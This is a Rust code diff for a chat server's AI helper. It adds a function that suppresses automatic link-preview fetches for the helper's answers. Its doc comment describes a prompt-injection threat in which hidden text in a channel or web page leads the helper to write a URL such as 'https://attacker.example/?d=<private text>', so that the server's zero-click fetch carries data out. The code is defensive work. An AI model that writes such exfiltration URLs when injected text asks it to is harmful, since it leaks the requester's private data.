@@ -486,6 +486,39 @@ pub async fn record_web_searches_in_tx(
     Ok(())
 }
 
+/// H5's exfiltration guard, carried to the answer itself (#3899 review).
+///
+/// The server fetches every `http(s)` URL a new message carries (ADR-0170 link
+/// previews: `message_unfurl_enqueue` → the unfurl worker GETs it). After the
+/// helper has read the workspace as the requester, or let the provider search
+/// the web, its answer may hold a URL that hidden text in a channel or a web page
+/// asked it to write — `https://attacker.example/?d=<private text>` — and that
+/// GET would carry the requester's data out with no click. Blocking search
+/// after a read (H5) does not close this path; this does.
+///
+/// Plants the same tombstone an author's 「미리보기 지우기」 plants
+/// (`momo_unfurl::remove`), in the answer's own transaction, so the worker skips
+/// the message (`tombstone_exists` is its first check). The link text stays and
+/// a person can still open it; only the server's zero-click fetch is withheld.
+pub async fn withhold_link_previews_in_tx(
+    conn: &mut PgConnection,
+    workspace_id: Uuid,
+    message_id: Uuid,
+    author_member_id: Uuid,
+) -> Result<(), DbError> {
+    sqlx::query(
+        "INSERT INTO message_unfurl_tombstone (workspace_id, message_id, removed_by) \
+         VALUES ($1, $2, $3) \
+         ON CONFLICT (message_id) DO NOTHING",
+    )
+    .bind(workspace_id)
+    .bind(message_id)
+    .bind(author_member_id)
+    .execute(&mut *conn)
+    .await?;
+    Ok(())
+}
+
 // ---------------------------------------------------------------------------
 // the context the model sees (D6-1, D6-6)
 // ---------------------------------------------------------------------------
